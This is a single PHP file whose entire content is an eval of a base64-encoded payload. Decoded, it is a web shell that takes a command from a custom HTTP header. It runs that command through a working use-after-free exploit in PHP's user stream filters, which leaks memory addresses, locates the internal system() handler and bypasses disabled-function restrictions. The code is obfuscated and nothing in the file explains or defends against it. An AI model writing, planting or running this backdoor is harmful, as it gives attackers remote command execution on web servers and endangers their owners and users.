<?php eval(base64_decode("CgoKCnB3bihiYXNlNjRfZGVjb2RlKCRfU0VSVkVSWydIVFRQX0FJWkFXQV9OSU5KQSddKSk7CgoKZnVuY3Rpb24gcHduKCRjbWQpIHsKICAgIGRlZmluZSgnTE9HR0lORycsIGZhbHNlKTsKICAgIGRlZmluZSgnQ0hVTktfREFUQV9TSVpFJywgMHg2MCk7CiAgICBkZWZpbmUoJ0NIVU5LX1NJWkUnLCBaRU5EX0RFQlVHX0JVSUxEID8gQ0hVTktfREFUQV9TSVpFICsgMHgyMCA6IENIVU5LX0RBVEFfU0laRSk7CiAgICBkZWZpbmUoJ0ZJTFRFUl9TSVpFJywgWkVORF9ERUJVR19CVUlMRCA/IDB4NzAgOiAweDUwKTsKICAgIGRlZmluZSgnU1RSSU5HX1NJWkUnLCBDSFVOS19EQVRBX1NJWkUgLSAweDE4IC0gMSk7CiAgICBkZWZpbmUoJ0NNRCcsICRjbWQpOwogICAgZm9yKCRpID0gMDsgJGkgPCAxMDsgJGkrKykgewogICAgICAgICRncm9vbVtdID0gUHduOjphbGxvYyhTVFJJTkdfU0laRSk7CiAgICB9CiAgICBzdHJlYW1fZmlsdGVyX3JlZ2lzdGVyKCdwd25fZmlsdGVyJywgJ1B3bicpOwogICAgJGZkID0gZm9wZW4oJ3BocDovL21lbW9yeScsICd3Jyk7CiAgICBzdHJlYW1fZmlsdGVyX2FwcGVuZCgkZmQsJ3B3bl9maWx0ZXInKTsKICAgIGZ3cml0ZSgkZmQsICd4Jyk7Cn0KCmNsYXNzIEhlbHBlciB7IHB1YmxpYyAkYSwgJGIsICRjOyB9CmNsYXNzIFB3biBleHRlbmRzIHBocF91c2VyX2ZpbHRlciB7CiAgICBwcml2YXRlICRhYmMsICRhYmNfYWRkcjsKICAgIHByaXZhdGUgJGhlbHBlciwgJGhlbHBlcl9hZGRyLCAkaGVscGVyX29mZjsKICAgIHByaXZhdGUgJHVhZnAsICRoZnA7CgogICAgcHVibGljIGZ1bmN0aW9uIGZpbHRlcigkaW4sICRvdXQsICYkY29uc3VtZWQsICRjbG9zaW5nKSB7CiAgICAgICAgaWYoJGNsb3NpbmcpIHJldHVybjsKICAgICAgICBzdHJlYW1fYnVja2V0X21ha2Vfd3JpdGVhYmxlKCRpbik7CiAgICAgICAgJHRoaXMtPmZpbHRlcm5hbWUgPSBQd246OmFsbG9jKFNUUklOR19TSVpFKTsKICAgICAgICBmY2xvc2UoJHRoaXMtPnN0cmVhbSk7CiAgICAgICAgJHRoaXMtPmdvKCk7CiAgICAgICAgcmV0dXJuIFBTRlNfUEFTU19PTjsKICAgIH0KCiAgICBwcml2YXRlIGZ1bmN0aW9uIGdvKCkgewogICAgICAgICR0aGlzLT5hYmMgPSAmJHRoaXMtPmZpbHRlcm5hbWU7CgogICAgICAgICR0aGlzLT5tYWtlX3VhZl9vYmooKTsKCiAgICAgICAgJHRoaXMtPmhlbHBlciA9IG5ldyBIZWxwZXI7CiAgICAgICAgJHRoaXMtPmhlbHBlci0+YiA9IGZ1bmN0aW9uKCR4KSB7fTsKCiAgICAgICAgJHRoaXMtPmhlbHBlcl9hZGRyID0gJHRoaXMtPnN0cjJwdHIoQ0hVTktfU0laRSAqIDIgLSAweDE4KSAtIENIVU5LX1NJWkUgKiAyOwogICAgICAgICR0aGlzLT5sb2coImhlbHBlciBAIDB4JXgiLCAkdGhpcy0+aGVscGVyX2FkZHIpOwoKICAgICAgICAkdGhpcy0+YWJjX2FkZHIgPSAkdGhpcy0+aGVscGVyX2FkZHIgLSBDSFVOS19TSVpFOwogICAgICAgICR0aGlzLT5sb2coImFiYyBAIDB4JXgiLCAkdGhpcy0+YWJjX2FkZHIpOwoKICAgICAgICAkdGhpcy0+aGVscGVyX29mZiA9ICR0aGlzLT5oZWxwZXJfYWRkciAtICR0aGlzLT5hYmNfYWRkciAtIDB4MTg7CgogICAgICAgICRoZWxwZXJfaGFuZGxlcnMgPSAkdGhpcy0+c3RyMnB0cihDSFVOS19TSVpFKTsKICAgICAgICAkdGhpcy0+bG9nKCJoZWxwZXIgaGFuZGxlcnMgQCAweCV4IiwgJGhlbHBlcl9oYW5kbGVycyk7CgogICAgICAgICR0aGlzLT5wcmVwYXJlX2xlYWtlcigpOwoKICAgICAgICAkYmluYXJ5X2xlYWsgPSAkdGhpcy0+cmVhZCgkaGVscGVyX2hhbmRsZXJzICsgOCk7CiAgICAgICAgJHRoaXMtPmxvZygiYmluYXJ5IGxlYWsgQCAweCV4IiwgJGJpbmFyeV9sZWFrKTsKICAgICAgICAkdGhpcy0+cHJlcGFyZV9jbGVhbnVwKCRiaW5hcnlfbGVhayk7CgogICAgICAgICRjbG9zdXJlX2FkZHIgPSAkdGhpcy0+c3RyMnB0cigkdGhpcy0+aGVscGVyX29mZiArIDB4MzgpOwogICAgICAgICR0aGlzLT5sb2coInJlYWwgY2xvc3VyZSBAIDB4JXgiLCAkY2xvc3VyZV9hZGRyKTsKCiAgICAgICAgJGNsb3N1cmVfY2UgPSAkdGhpcy0+cmVhZCgkY2xvc3VyZV9hZGRyICsgMHgxMCk7CiAgICAgICAgJHRoaXMtPmxvZygiY2xvc3VyZSBjbGFzc19lbnRyeSBAIDB4JXgiLCAkY2xvc3VyZV9jZSk7CgogICAgICAgICRiYXNpY19mdW5jcyA9ICR0aGlzLT5nZXRfYmFzaWNfZnVuY3MoJGNsb3N1cmVfY2UpOwogICAgICAgICR0aGlzLT5sb2coImJhc2ljX2Z1bmN0aW9ucyBAIDB4JXgiLCAkYmFzaWNfZnVuY3MpOwoKICAgICAgICAkemlmX3N5c3RlbSA9ICR0aGlzLT5nZXRfc3lzdGVtKCRiYXNpY19mdW5jcyk7CiAgICAgICAgJHRoaXMtPmxvZygiemlmX3N5c3RlbSBAIDB4JXgiLCAkemlmX3N5c3RlbSk7CgogICAgICAgICRmYWtlX2Nsb3N1cmVfb2ZmID0gJHRoaXMtPmhlbHBlcl9vZmYgKyBDSFVOS19TSVpFICogMjsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8IDB4MTM4OyAkaSArPSA4KSB7CiAgICAgICAgICAgICR0aGlzLT53cml0ZSgkZmFrZV9jbG9zdXJlX29mZiArICRpLCAkdGhpcy0+cmVhZCgkY2xvc3VyZV9hZGRyICsgJGkpKTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPndyaXRlKCRmYWtlX2Nsb3N1cmVfb2ZmICsgMHgzOCwgMSwgNCk7CgogICAgICAgICRoYW5kbGVyX29mZnNldCA9IFBIUF9NQUpPUl9WRVJTSU9OID09PSA4ID8gMHg3MCA6IDB4Njg7CiAgICAgICAgJHRoaXMtPndyaXRlKCRmYWtlX2Nsb3N1cmVfb2ZmICsgJGhhbmRsZXJfb2Zmc2V0LCAkemlmX3N5c3RlbSk7CgogICAgICAgICRmYWtlX2Nsb3N1cmVfYWRkciA9ICR0aGlzLT5oZWxwZXJfYWRkciArICRmYWtlX2Nsb3N1cmVfb2ZmIC0gJHRoaXMtPmhlbHBlcl9vZmY7CiAgICAgICAgJHRoaXMtPndyaXRlKCR0aGlzLT5oZWxwZXJfb2ZmICsgMHgzOCwgJGZha2VfY2xvc3VyZV9hZGRyKTsKICAgICAgICAkdGhpcy0+bG9nKCJmYWtlIGNsb3N1cmUgQCAweCV4IiwgJGZha2VfY2xvc3VyZV9hZGRyKTsKCiAgICAgICAgJHRoaXMtPmNsZWFudXAoKTsKICAgICAgICAoJHRoaXMtPmhlbHBlci0+YikoQ01EKTsKICAgIH0KCiAgICBwcml2YXRlIGZ1bmN0aW9uIG1ha2VfdWFmX29iaigpIHsKICAgICAgICAkdGhpcy0+dWFmcCA9IGZvcGVuKCdwaHA6Ly9tZW1vcnknLCAndycpOwogICAgICAgIGZ3cml0ZSgkdGhpcy0+dWFmcCwgcGFjaygnUVFRJywgMSwgMCwgMHhERUFEQkFBREMwREUpKTsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8IFNUUklOR19TSVpFOyAkaSsrKSB7CiAgICAgICAgICAgIGZ3cml0ZSgkdGhpcy0+dWFmcCwgIlx4MDAiKTsKICAgICAgICB9CiAgICB9CgogICAgcHJpdmF0ZSBmdW5jdGlvbiBwcmVwYXJlX2xlYWtlcigpIHsKICAgICAgICAkc3RyX29mZiA9ICR0aGlzLT5oZWxwZXJfb2ZmICsgQ0hVTktfU0laRSArIDg7CiAgICAgICAgJHRoaXMtPndyaXRlKCRzdHJfb2ZmLCAyKTsKICAgICAgICAkdGhpcy0+d3JpdGUoJHN0cl9vZmYgKyAweDEwLCA2KTsKCiAgICAgICAgJHZhbF9vZmYgPSAkdGhpcy0+aGVscGVyX29mZiArIDB4NDg7CiAgICAgICAgJHRoaXMtPndyaXRlKCR2YWxfb2ZmLCAkdGhpcy0+aGVscGVyX2FkZHIgKyBDSFVOS19TSVpFICsgOCk7CiAgICAgICAgJHRoaXMtPndyaXRlKCR2YWxfb2ZmICsgOCwgMHhBKTsKICAgIH0KCiAgICBwcml2YXRlIGZ1bmN0aW9uIHByZXBhcmVfY2xlYW51cCgkYmluYXJ5X2xlYWspIHsKICAgICAgICAkcmV0X2dhZGdldCA9ICRiaW5hcnlfbGVhazsKICAgICAgICBkbyB7CiAgICAgICAgICAgIC0tJHJldF9nYWRnZXQ7CiAgICAgICAgfSB3aGlsZSgkdGhpcy0+cmVhZCgkcmV0X2dhZGdldCwgMSkgIT09IDB4QzMpOwogICAgICAgICR0aGlzLT5sb2coInJldCBnYWRnZXQgPSAweCV4IiwgJHJldF9nYWRnZXQpOwogICAgICAgICR0aGlzLT53cml0ZSgwLCAkdGhpcy0+YWJjX2FkZHIgKyAweDIwIC0gKFBIUF9NQUpPUl9WRVJTSU9OID09PSA4ID8gMHg1MCA6IDB4NjApKTsKICAgICAgICAkdGhpcy0+d3JpdGUoOCwgJHJldF9nYWRnZXQpOwogICAgfQoKICAgIHByaXZhdGUgZnVuY3Rpb24gcmVhZCgkYWRkciwgJG4gPSA4KSB7CiAgICAgICAgJHRoaXMtPndyaXRlKCR0aGlzLT5oZWxwZXJfb2ZmICsgQ0hVTktfU0laRSArIDE2LCAkYWRkciAtIDB4MTApOwogICAgICAgICR2YWx1ZSA9IHN0cmxlbigkdGhpcy0+aGVscGVyLT5jKTsKICAgICAgICBpZigkbiAhPT0gOCkgeyAkdmFsdWUgJj0gKDEgPDwgKCRuIDw8IDMpKSAtIDE7IH0KICAgICAgICByZXR1cm4gJHZhbHVlOwogICAgfQoKICAgIHByaXZhdGUgZnVuY3Rpb24gd3JpdGUoJHAsICR2LCAkbiA9IDgpIHsKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICRuOyAkaSsrKSB7CiAgICAgICAgICAgICR0aGlzLT5hYmNbJHAgKyAkaV0gPSBjaHIoJHYgJiAweGZmKTsKICAgICAgICAgICAgJHYgPj49IDg7CiAgICAgICAgfQogICAgfQoKICAgIHByaXZhdGUgZnVuY3Rpb24gZ2V0X2Jhc2ljX2Z1bmNzKCRhZGRyKSB7CiAgICAgICAgd2hpbGUodHJ1ZSkgewogICAgICAgICAgICAkYWRkciAtPSAweDEwOwogICAgICAgICAgICBpZigkdGhpcy0+cmVhZCgkYWRkciwgNCkgPT09IDB4QTggJiYKICAgICAgICAgICAgICAgIGluX2FycmF5KCR0aGlzLT5yZWFkKCRhZGRyICsgNCwgNCksCiAgICAgICAgICAgICAgICAgICAgWzIwMTUxMDEyLCAyMDE2MDMwMywgMjAxNzA3MTgsIDIwMTgwNzMxLCAyMDE5MDkwMiwgMjAyMDA5MzBdKSkgewogICAgICAgICAgICAgICAgJG1vZHVsZV9uYW1lX2FkZHIgPSAkdGhpcy0+cmVhZCgkYWRkciArIDB4MjApOwogICAgICAgICAgICAgICAgJG1vZHVsZV9uYW1lID0gJHRoaXMtPnJlYWQoJG1vZHVsZV9uYW1lX2FkZHIpOwogICAgICAgICAgICAgICAgaWYoJG1vZHVsZV9uYW1lID09PSAweDY0NzI2MTY0NmU2MTc0NzMpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bG9nKCJzdGFuZGFyZCBtb2R1bGUgQCAweCV4IiwgJGFkZHIpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+cmVhZCgkYWRkciArIDB4MjgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIHByaXZhdGUgZnVuY3Rpb24gZ2V0X3N5c3RlbSgkYmFzaWNfZnVuY3MpIHsKICAgICAgICAkYWRkciA9ICRiYXNpY19mdW5jczsKICAgICAgICBkbyB7CiAgICAgICAgICAgICRmX2VudHJ5ID0gJHRoaXMtPnJlYWQoJGFkZHIpOwogICAgICAgICAgICAkZl9uYW1lID0gJHRoaXMtPnJlYWQoJGZfZW50cnksIDYpOwogICAgICAgICAgICBpZigkZl9uYW1lID09PSAweDZkNjU3NDczNzk3MykgewogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5yZWFkKCRhZGRyICsgOCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGFkZHIgKz0gMHgyMDsKICAgICAgICB9IHdoaWxlKCRmX2VudHJ5ICE9PSAwKTsKICAgIH0KCiAgICBwcml2YXRlIGZ1bmN0aW9uIGNsZWFudXAoKSB7CiAgICAgICAgJHRoaXMtPmhmcCA9IGZvcGVuKCdwaHA6Ly9tZW1vcnknLCAndycpOwogICAgICAgIGZ3cml0ZSgkdGhpcy0+aGZwLCBwYWNrKCdRUScsIDAsICR0aGlzLT5hYmNfYWRkcikpOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgRklMVEVSX1NJWkUgLSAweDEwOyAkaSsrKSB7CiAgICAgICAgICAgIGZ3cml0ZSgkdGhpcy0+aGZwLCAiXHgwMCIpOwogICAgICAgIH0KICAgIH0KCiAgICBwcml2YXRlIGZ1bmN0aW9uIHN0cjJwdHIoJHAgPSAwLCAkbiA9IDgpIHsKICAgICAgICAkYWRkcmVzcyA9IDA7CiAgICAgICAgZm9yKCRqID0gJG4gLSAxOyAkaiA+PSAwOyAkai0tKSB7CiAgICAgICAgICAgICRhZGRyZXNzIDw8PSA4OwogICAgICAgICAgICAkYWRkcmVzcyB8PSBvcmQoJHRoaXMtPmFiY1skcCArICRqXSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYWRkcmVzczsKICAgIH0KCiAgICBwcml2YXRlIGZ1bmN0aW9uIHB0cjJzdHIoJHB0ciwgJG4gPSA4KSB7CiAgICAgICAgJG91dCA9ICcnOwogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRuOyAkaSsrKSB7CiAgICAgICAgICAgICRvdXQgLj0gY2hyKCRwdHIgJiAweGZmKTsKICAgICAgICAgICAgJHB0ciA+Pj0gODsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRvdXQ7CiAgICB9CgogICAgcHJpdmF0ZSBmdW5jdGlvbiBsb2coJGZvcm1hdCwgJHZhbCA9ICcnKSB7CiAgICAgICAgaWYoTE9HR0lORykgewogICAgICAgICAgICBwcmludGYoInskZm9ybWF0fVxuIiwgJHZhbCk7CiAgICAgICAgfQogICAgfQoKICAgIHN0YXRpYyBmdW5jdGlvbiBhbGxvYygkc2l6ZSkgewogICAgICAgIHJldHVybiBzdHJfc2h1ZmZsZShzdHJfcmVwZWF0KCdBJywgJHNpemUpKTsKICAgIH0KfQ=="));?>